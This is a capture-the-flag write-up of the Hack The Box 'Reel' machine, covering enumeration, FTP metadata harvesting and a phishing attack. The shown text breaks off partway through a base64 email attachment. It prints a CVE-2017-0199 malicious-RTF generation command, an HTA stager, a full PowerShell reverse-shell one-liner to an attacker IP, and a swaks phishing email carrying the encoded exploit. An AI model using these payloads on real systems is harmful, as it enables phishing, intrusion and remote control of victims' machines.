# [reel](https://app.hackthebox.com/machines/Reel)

> A Windows Active Directory domain controller with an FTP server that contained two files of interest: a note that indicated some user would open any RTF file they were emailed and a Word document whose metadata revealed the email address of said user. Phishing the user with a malicious RTF document granted a reverse shell on the target. The phished user's desktop contained a file of another user's XML-serialized `PSCredential`. Deserializing this object revealed that user's password. Logging in as the other user via SSH and performing some domain enumeration indicated the current user had control of another user's account and this user had control over a high privileged group. Moving laterally to this other user's account granted access to a directory of backup scripts on the domain administrator's desktop, one of which contained the domain administrator's plaintext password.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.1.151 --rate=1000 -e tun0 --output-format grepable --output-filename enum/reel.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-10 18:19:41 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/reel.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
21,22,25,
```

```bash
$ sudo nmap -sC -sV -O -p21,22,25 10.129.1.151 -oA enum/reel
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 13:24 EST
Nmap scan report for 10.129.1.151
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-28-18  11:19PM       <DIR>          documents
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello:
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help:
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie:
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.92%I=7%D=11/10%Time=618C0E4D%P=x86_64-pc-linux-gnu%r(NUL
SF:L,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20
SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")
SF:%r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E
SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n
SF:")%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Ba
SF:d\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comm
SF:ands\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVe
SF:rsionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRe
SF:questTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"
SF:220\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x2
SF:0Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerber
SF:os,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Ma
SF:il\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20r
SF:eady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n5
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
SF:\x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n"
SF:)%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindR
SF:eq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20o
SF:f\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequen
SF:ce\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%), Microsoft Windows Vista SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.63 seconds
```

The target is serving FTP, SSH, and SMTP. The FTP server allows anonymous login. `nmap` guesses the operating system of the target is Windows.

### UDP

```bash
$ sudo nmap -sU 10.129.1.151
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 13:27 EST
Nmap scan report for 10.129.1.151
Host is up (0.040s latency).
All 1000 scanned ports on 10.129.1.151 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 42.00 seconds
```

---

## FTP Enumeration

The `documents` directory contains three files: `AppLocker.docx`, `readme.txt`, and `Windows Event Forwarding.docx`.

```bash
$ ftp
ftp> open 10.129.1.151
Connected to 10.129.1.151.
220 Microsoft FTP Service
Name (10.129.1.151:tgihf): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
```

Download all of the files for offline inspection.

```bash
ftp> mget *
mget AppLocker.docx? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 9 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
2047 bytes received in 0.04 secs (46.7400 kB/s)
mget readme.txt? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
124 bytes received in 0.04 secs (3.1029 kB/s)
mget Windows Event Forwarding.docx? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 51 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
14581 bytes received in 0.08 secs (180.6050 kB/s)
```

Output each file's metadata.

```bash
$ tmux show-buffer
ExifTool Version Number         : 12.32
File Name                       : readme.txt
Directory                       : .
File Size                       : 122 bytes
File Modification Date/Time     : 2021:11:10 13:32:56-05:00
File Access Date/Time           : 2021:11:10 13:32:56-05:00
File Inode Change Date/Time     : 2021:11:10 13:33:28-05:00
File Permissions                : -rw-r--r--
File Type                       : TXT
File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : us-ascii
Newlines                        : Unix LF
Line Count                      : 3
Word Count                      : 21
```

```bash
$ exiftool AppLocker.docx
ExifTool Version Number         : 12.32
File Name                       : AppLocker.docx
Directory                       : .
File Size                       : 2047 bytes
File Modification Date/Time     : 2021:11:10 13:32:55-05:00
File Access Date/Time           : 2021:11:10 13:32:55-05:00
File Inode Change Date/Time     : 2021:11:10 13:33:26-05:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0008
Zip Compression                 : Deflated
Zip Modify Date                 : 2018:05:29 00:19:50
Zip CRC                         : 0x3cdd8b4f
Zip Compressed Size             : 166
Zip Uncompressed Size           : 284
Zip File Name                   : _rels/.rels
```

```bash
$ exiftool Windows\ Event\ Forwarding.docx
ExifTool Version Number         : 12.32
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 14 KiB
File Modification Date/Time     : 2021:11:10 13:32:57-05:00
File Access Date/Time           : 2021:11:10 13:32:57-05:00
File Inode Change Date/Time     : 2021:11:10 13:33:32-05:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 :
Company                         :
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```

It appears the `Windows Event Forwarding.docx` file was authored by `nico@megabank.com`. This is a potential username.

Inspect each of the files.

```bash
$ cat readme.txt
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

Apparently if this user (`nico`?) receives any rich-text formatted (RTF) documents via email, they will open them, convert them, and save them to the `documents` directory.

`AppLocker.docx` indicates there are active `AppLocker` rules for `exe`, `msi`, `ps1`, `vbs`, `cmd`, `bat`, and `js` files.

![](images/Pasted%20image%2020211110135212.png)

`Windows Event Forwarding.docx`

Apparently this file was corrupted and couldn't be opened by LibreOffice.

---

## Phishing `nico`

`readme.txt` from the FTP server seems to indicate that some user is susceptible to phishing. The only possible username found is `nico@megabank.com`. Before attempting to phish this user, attempt to verify that it is indeed a valid user.

```bash
$ smtp-user-enum -M RCPT -u nico@megabank.local -t 10.129.1.151
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Wed Nov 10 14:06:16 2021 #########
10.129.1.151: nico@megabank.local exists
######## Scan completed at Wed Nov 10 14:06:17 2021 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)
```

It appears that `nico@megabank.local` is indeed a valid user.

`readme.txt` specified that the user would open RTF files. A bit of research revealed [this article by Mcafee](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/an-inside-look-into-microsoft-rich-text-format-and-ole-exploits/) that explores the mechanics of delivering malicious payloads via RTF files. [The CVE-2017-0199 exploit toolkit repository](https://github.com/bhdresh/CVE-2017-0199) is capable of generating a malicious RTF that will stage a remote file and execute it with whatever application is configured in the target's operating system to execute that particular type of file.

Use it to generate malicious RTF file that will stage and execute a malicious HTA file.

```bash
$ python cve-2017-0199_toolkit.py -M gen -w Manual.rtf -u http://10.10.14.81/Manual.hta -x 0
Generating normal RTF payload.

Generated Manual.rtf successfully
```

Use [nishang](https://github.com/samratashok/nishang) to generate the malicious HTA file that will stage and execute a PowerShell one-liner.

```bash
PS /home/tgihf/workspace/htb/boxes/reel/web> Out-HTA -PayloadURL http://10.10.14.81/Manual.ps1 -HTAFilePath Manual.hta
HTA written to Manual.hta.
```

Copy a PowerShell one-liner from [nishang](https://github.com/samratashok/nishang) and modify the listener IP address and port to that of the reverse shell handler. Save it to disk.

```bash
$ cat Manual.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.81',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Start a web server to serve the HTA and PowerShell one-liners.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start a reverse shell handler.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Phish `nico@megabank.com` and attach the malicious RTF file (`Manual.rtf`).

```bash
$ swaks --to nico@megabank.com --from tgihf@megabank.com --header 'Subject: User Manual v2.0.1 Revision' --body "Here's the latest revision on the user manual, Nico. I might have more revisions for you later." --server 10.129.1.151 --attach @Manual.rtf
=== Trying 10.129.1.151:25...
=== Connected to 10.129.1.151.
<-  220 Mail Service ready
 -> EHLO attack.tgif.home
<-  250-REEL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> MAIL FROM:<tgihf@megabank.com>
<-  250 OK
 -> RCPT TO:<nico@megabank.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Thu, 11 Nov 2021 17:48:37 -0500
 -> To: nico@megabank.com
 -> From: tgihf@megabank.com
 -> Subject: User Manual v2.0.1 Revision
 -> Message-Id: <20211111174837.030115@attack.tgif.home>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_30115"
 ->
 -> ------=_MIME_BOUNDARY_000_30115
 -> Content-Type: text/plain
 ->
 -> Here's the latest revision on the user manual, Nico. I might have more revisions for you later.
 -> ------=_MIME_BOUNDARY_000_30115
 -> Content-Type: application/octet-stream; name="@Manual.rtf"
 -> Content-Description: @Manual.rtf
 -> Content-Disposition: attachment; filename="@Manual.rtf"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> e1xydGYxXGFkZWZsYW5nMTAyNVxhbnNpXGFuc2ljcGcxMjUyXHVjMVxhZGVmZjMxNTA3XGRlZmYw
 -> XHN0c2hmZGJjaDMxNTA1XHN0c2hmbG9jaDMxNTA2XHN0c2hmaGljaDMxNTA2XHN0c2hmYmkzMTUw
 -> N1xkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUyXHRoZW1lbGFuZzEwMzNcdGhlbWVsYW5nZmUyMDUy
 -> XHRoZW1lbGFuZ2NzMAp7XGluZm8Ke1xhdXRob3IgfQp7XG9wZXJhdG9yIH0KfQp7XCpceG1sbnN0
 -> Ymwge1x4bWxuczEgaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9vZmZpY2Uvd29yZC8yMDAz
 -> L3dvcmRtbH19CnsKe1xvYmplY3Rcb2JqYXV0bGlua1xvYmp1cGRhdGVccnNsdHBpY3Rcb2JqdzI5
 -> MVxvYmpoMjMwXG9ianNjYWxleDk5XG9ianNjYWxleTEwMQp7XCpcb2JqY2xhc3MgV29yZC5Eb2N1
 -> bWVudC44fQp7XCpcb2JqZGF0YSAwMTA1MDAwMDAyMDAwMDAwCjA5MDAwMDAwNGY0YzQ1MzI0YzY5
 -> NmU2YjAwMDAwMDAwMDAwMDAwMDAwMDAwMGEwMDAwCmQwY2YxMWUwYTFiMTFhZTEwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDNlMDAwMzAwZmVmZjA5MDAwNjAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMTAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDEwMDAwMDAyMDAwMDAwMDEwMDAwMDBmZWZm
 -> ZmZmZjAwMDAwMDAwMDAwMDAwMDBmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZgpm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmYKZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmCmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZgpmZmZmZmZmZmZmZmZmZmZmZmRmZmZmZmZmZWZmZmZmZmZlZmZmZmZm
 -> ZmVmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmYKZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmCmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZgpmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmYKZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmY1MjAwNmYwMDZmMDA3NDAwMjAwMDQ1
 -> MDA2ZTAwNzQwMDcyMDA3OTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDE2MDAwNTAw
 -> ZmZmZmZmZmZmZmZmZmZmZjAyMDAwMDAwMDAwMzAwMDAwMDAwMDAwMGMwMDAwMDAwMDAwMDAwNDYw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA3MDRkCjZjYTYzN2I1ZDIwMTAzMDAwMDAwMDAwMjAwMDAw
 -> MDAwMDAwMDAxMDA0ZjAwNmMwMDY1MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMGEwMDAyMDBmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmYwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDBmMDAwMDAwMDAwMDAwMDAwMDMwMDRmMDA2MjAwNmEwMDQ5MDA2
 -> ZTAwNjYwMDZmMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMjAwMDIw
 -> MTAxMDAwMDAwMDMwMDAwMDBmZmZmZmZmZjAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMDAwNDAwMDAwMDA2MDAwMDAw
 -> MDAwMDAwMDAwMzAwNGMwMDY5MDA2ZTAwNmIwMDQ5MDA2ZTAwNjYwMDZmMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDE0MDAwMjAwZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwCjAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDA1MDAwMDAwYjcwMDAwMDAwMDAwMDAwMDAxMDAwMDAwMDIwMDAwMDAwMzAw
 -> MDAwMGZlZmZmZmZmZmVmZmZmZmYwNjAwMDAwMDA3MDAwMDAwZmVmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZgpmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmYKZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmCmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZgpmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZm
 -> ZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmCjAxMDAwMDAyMDkwMDAwMDAw
